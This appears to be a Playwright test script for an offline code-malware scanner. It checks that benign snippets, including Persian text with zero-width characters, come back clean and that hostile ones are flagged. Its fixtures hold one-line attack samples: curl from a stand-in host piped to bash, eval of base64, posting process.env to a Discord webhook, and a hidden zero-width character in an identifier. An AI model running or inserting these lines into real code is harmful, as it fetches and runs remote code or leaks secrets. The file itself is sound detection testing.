// Guards the offline scanner's calibration: ordinary code (and Persian text) must stay
// clean, while real attack signatures must still be reported.
const { chromium } = require('playwright');
const { pathToFileURL } = require('node:url');
const path = require('node:path');
const assert = require('node:assert/strict');

const ZWNJ = '\u200C'; // نیم‌فاصلهٔ فارسی — کاملاً عادی
const ZWJ = '\u200D';  // اتصال‌دهندهٔ عرض‌صفر — می‌تواند بک‌دور نامرئی بسازد

const CLEAN = {
  'health endpoint with hostname and metrics post': [
    'const os = require("os");',
    'app.get("/health", async (req, res) => {',
    '  const info = { host: os.hostname(), platform: process.platform };',
    '  await fetch("https://metrics.example.com/report", { method: "POST", body: JSON.stringify(info) });',
    '  res.json({ ok: true });',
    '});'
  ].join('\n'),
  'persian string with ZWNJ': 'const msg = "می' + ZWNJ + 'خواهم";\nconsole.log(msg);',
  'persian string with ZWJ': 'const msg = "می' + ZWJ + 'خواهم";\nconsole.log(msg);',
  'emoji string': 'const label = "ok 👨' + ZWJ + '💻";\nconsole.log(label);',
  'parameterised SQL': 'const rows = await db.query("SELECT * FROM users WHERE id = ?", [id]);',
  'react form component': 'import React, { useState } from "react";\nexport default function F() { const [v, setV] = useState(""); return <input value={v} onChange={e => setV(e.target.value)} />; }'
};

const DIRTY = {
  'curl piped to shell': 'curl -s https://evil.example/p.sh | bash',
  'eval of base64 payload': 'eval(atob("Y29uc29sZS5sb2coMSk="));',
  'discord webhook exfiltration': 'fetch("https://discord.com/api/webhooks/123/abc", { method: "POST", body: JSON.stringify(process.env) });',
  'invisible character inside an identifier': 'const ad' + ZWJ + 'min = 1;\nconsole.log(admin);'
};

(async () => {
  const browser = await chromium.launch({ headless: true, channel: process.env.BROWSER_CHANNEL || undefined });
  try {
    for (const source of ['index.html', 'native/Web/index.html']) {
      const page = await browser.newPage({ viewport: { width: 393, height: 852 } });
      await page.addInitScript(() => localStorage.setItem('cognicode.launch-seen.v1', '1'));
      await page.goto(pathToFileURL(path.resolve(__dirname, '..', source)).href);
      await page.waitForFunction(() => !!window.Malwatch && !!window.Syntax);
      const scan = (code) => page.evaluate(code => {
        const lang = window.Syntax.detect(code);
        const res = window.Malwatch.scan(code, lang);
        return { lang, verdict: res.verdict, score: res.score, rules: res.findings.map(f => f.rule) };
      }, code);

      for (const [name, code] of Object.entries(CLEAN)) {
        const r = await scan(code);
        assert.equal(r.verdict, 'clean', `${source} → "${name}" must stay clean (got ${r.verdict} ${r.score} ${r.rules.join(',')})`);
        console.log(`PASS ${source}: clean — ${name}`);
      }
      for (const [name, code] of Object.entries(DIRTY)) {
        const r = await scan(code);
        assert.notEqual(r.verdict, 'clean', `${source} → "${name}" must not be reported clean`);
        assert.ok(r.rules.length > 0, `${source} → "${name}" must produce at least one finding`);
        console.log(`PASS ${source}: flagged — ${name} (${r.verdict} ${r.score}: ${r.rules.join(',')})`);
      }
      await page.close();
    }
  } finally { await browser.close(); }
})().catch(e => { console.error(e); process.exitCode = 1; });
